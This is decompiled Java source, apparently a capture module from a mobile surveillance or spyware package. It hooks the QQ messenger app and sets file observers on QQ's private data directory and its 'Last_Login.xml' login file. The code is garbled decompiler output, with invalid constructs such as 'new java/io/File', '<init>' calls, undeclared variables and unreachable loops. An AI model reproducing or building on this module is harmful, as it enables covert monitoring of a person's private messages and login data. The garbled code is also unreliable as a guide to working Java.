package com.vvt.capture.qq.a;

import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class b implements com.vvt.base.capture.e, m {
    private static final boolean a = com.vvt.ak.a.a;
    private static final boolean b = com.vvt.ak.a.b;
    private static final boolean c = com.vvt.ak.a.e;
    private static String i;
    private QQFileObserver d;
    private i e;
    private j f;
    private e g;
    private boolean h;

    public void a(i parami) {
        boolean bool = a;
        if (bool) {}
        bool = true;
        this.h = bool;
        this.e = parami;
        j localj = this.f;
        if (localj == null) {
            localj = j.a();
            this.f = localj;
        }
        localj = this.f;
        String str = "com.tencent.mobileqq";
        localj.a(str, this);
        bool = a;
        if (bool) {}
    }

    public void a(String paramString) {
        bool = a;
        if (bool) {}
        try {
            if (this.d != null) {
                bool = a;
                if (bool) {}
                localObject = this.d;
                ((QQFileObserver)localObject).stopWatching();
            }

            if (this.g != null) {
                bool = b;
                if (bool) {}
                localObject = this.g;
                ((e)localObject).stopWatching();
            }
        }
        catch (Exception e) {
        }

        this.d = null;
        this.g = null;
        i = null;
        bool = a;
        if (bool) {}
    }

    public void a(String paramString1, String paramString2) {}

    public void b()
    {
        bool = a;
        if (bool) {}
        bool = false;
        Object localObject = null;
        try
        {
            this.h = false;
            localObject = this.d;
            if (localObject != null)
            {
                bool = a;
                if (bool) {}
                localObject = this.d;
                ((QQFileObserver)localObject).stopWatching();
            }
            localObject = this.g;
            if (localObject != null)
            {
                bool = b;
                if (bool) {}
                localObject = this.g;
                ((e)localObject).stopWatching();
            }
            localObject = this.f;
            if (localObject != null)
            {
                localObject = this.f;
                String str = "com.tencent.mobileqq";
                ((j)localObject).a(str);
            }
        }
        catch (Exception e) {
        }

        i = null;
        this.g = null;
        this.d = null;
        bool = a;
        if (bool) {}
    }

    public void b(String paramString1, String paramString2)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = com.vvt.n.a.d.a.a();
        boolean bool2 = a;
        if (bool2) {}
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
            Object localObject2 = new java/io/File;
            ((File)localObject2).<init>((String)localObject1);
            bool2 = ((File)localObject2).exists();
            if (bool2)
            {
                localObject2 = this.d;
                if (localObject2 == null)
                {
                    bool2 = b;
                    if (bool2) {}
                    localObject2 = new com/vvt/capture/qq/a/c;
                    ((QQFileObserver)localObject2).<init>(this, (String)localObject1);
                    this.d = ((QQFileObserver)localObject2);
                    localObject1 = this.d;
                    ((QQFileObserver)localObject1).startWatching();
                }
            }
        }
        bool1 = a;
        if (bool1) {}
    }

    public void c(String paramString1, String paramString2) {
        boolean bool1 = b;
        if (bool1) {}
        String filePath = "/data/data/com.tencent.mobileqq/shared_prefs/Last_Login.xml";
        File file = new java.io.File(filePath);
        boolean bool2 = file.exists();
        if (bool2) {
            localObject2 = this.g;
            if (localObject2 == null) {
                bool2 = b;
                if (bool2) {}
                localObject2 = new com.vvt.capture.qq.a.e(this, (String)localObject1);
                this.g = ((e)localObject2);
                this.g.startWatching();
            }
        }

        for (;;) {
            bool1 = b;
            if (bool1) {}
            return;
            bool1 = b;
            if (!bool1) {}
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */